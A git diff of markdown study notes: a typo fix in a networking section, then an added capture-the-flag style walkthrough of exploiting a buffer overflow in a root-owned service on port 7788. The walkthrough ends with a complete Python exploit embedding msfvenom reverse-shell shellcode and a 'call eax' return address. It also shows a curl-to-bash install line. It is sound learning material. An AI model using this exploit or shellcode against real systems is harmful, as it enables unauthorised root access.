@@ -21,7 +21,7 @@ Number of IPv4 vs IPv6 possible addresses
 
 ## MAC Addresses (OUI and NIC)
 
-A MAC address is an 48 bits identifier that belongs to only one phisical device
+A MAC address is an 48 bits identifier that belongs to only one physical device
 
 ![[Untitled 3 3.png|Untitled 3 3.png]]
 
@@ -5948,3 +5948,86 @@ The first one is a compiled binary, an the second is some config file
 ![[Pasted image 20241219164655.png]]
 Seems like a service is being deployed by the user root in the port 7788
 ![[Pasted image 20241219164903.png]]
+ Now Ill get the binary by encoding it to b64 to then serve it to my attacker machine
+![[Pasted image 20241222204530.png]]
+Now using ltrace I can see that the ID is hardcoded in the code
+![[Pasted image 20241222210545.png]]
+Testing for the options I can see that the third option is vulnerable to a BOF
+![[Pasted image 20241222210753.png]]
+Lets use ghidra for this
+![[Pasted image 20241222212051.png]]
+Doing some research I found the vulnerable function
+![[Pasted image 20241222215650.png]]
+![[Pasted image 20241222215725.png]]
+Now lets try and exploit this BOF, for this Ill install GDB GEF, which is a debbuger, so we can run the binary while debbuging
+Using `apt install gdb` and then lets install GEF
+`bash -c "$(curl -fsSL https://gef.blah.cat/sh)"`
+![[Pasted image 20241223005710.png]]
+Now lets run the binary and test what happens
+![[Pasted image 20241223005846.png]]
+As we can see, now the registers are populated and we can begin to test and see how to control the EIP
+![[Pasted image 20241223005921.png]]
+Now, once we are here, we need to know the actual offset, so we use pattern create to this, and then use it in the program
+![[Pasted image 20241223010523.png]]
+Once used, we can use another tool 'pattern offset' and use the eip value to calculate the offset
+![[Pasted image 20241223010613.png]]
+Now, lets try this. By creating a string of 168 'A' characters, and 4 'B' we can see if we have control
+![[Pasted image 20241223010836.png]]
+And yes, we can control the EIP
+Now, what I noticed is that after overflowing the stack, all the data we send is at the beggining of the EAX register, so this is interesting since now we need an op code to "call eax" and execute our shellcode
+The shellcode that we are going to use is the following
+![[Pasted image 20241223013506.png]]
+Lets create an python exploit, and begin this BOF
+![[Pasted image 20241223013935.png]]
+Now, to now the Op Code for 'call eax' lets use a metasploit tool, nasm_shell
+![[Pasted image 20241223014158.png]]
+So, in the binary we have the op code
+![[Pasted image 20241223014305.png]]
+So, the exploit is looking somthing loke this
+![[Pasted image 20241223014937.png]]
+Since the shellcode length is 95 bytes, we need to add 'A' so we can overflow
+Now, this is how it ended
+![[Pasted image 20241223021029.png]]
+```python
+#!/usr/bin/python3
+                                                                                                                                                                                                                                            
+import socket
+                                                                                                                                                                                                                                            
+offset = 168
+                                                                                                                                                                                                                                            
+call_eax_opcode = 8048563
+                                                                                                                                                                                                                                            
+#shellcode --> msfvenom -p linux/x86/shell_reverse_tcp -f python LHOST= LPORT= -b "\x00\x0a\x0d"
+                                                                                                                                                                                                                                            
+buf =  b""
+buf += b"\xb8\xab\x3a\x98\xaa\xdd\xc6\xd9\x74\x24\xf4\x5a"
+buf += b"\x29\xc9\xb1\x12\x31\x42\x12\x03\x42\x12\x83\x41"
+buf += b"\xc6\x7a\x5f\xa4\xec\x8c\x43\x95\x51\x20\xee\x1b"
+buf += b"\xdf\x27\x5e\x7d\x12\x27\x0c\xd8\x1c\x17\xfe\x5a"
+buf += b"\x15\x11\xf9\x32\x66\x49\xf8\xe5\x0e\x88\xfb\xe8"
+buf += b"\x75\x05\x1a\x5a\xef\x46\x8c\xc9\x43\x65\xa7\x0c"
+buf += b"\x6e\xea\xe5\xa6\x1f\xc4\x7a\x5e\x88\x35\x52\xfc"
+buf += b"\x21\xc3\x4f\x52\xe1\x5a\x6e\xe2\x0e\x90\xf1"
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+#padding
+buf += b"A"*(offset-len(buf))
+                                                                                                                                                                                                                                            
+#opcode in little endian
+buf += b"\x63\x85\x04\x08\n" #0x08048563 CALL EAX
+                                                                                                                                                                                                                                            
+#connect to service
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                            
+s.connect(('127.0.0.1', 7788))          
+#send Agent ID                                                
+s.send(b"48093572\n")
+data = s.recv(1024)
+#select option 3
+s.send(b"3\n")
+data = s.recv(1024)
+#send data
+s.send(buf)
+data = s.recv(1024)
+```
+![[Pasted image 20241223021226.png]]
+ROOTED
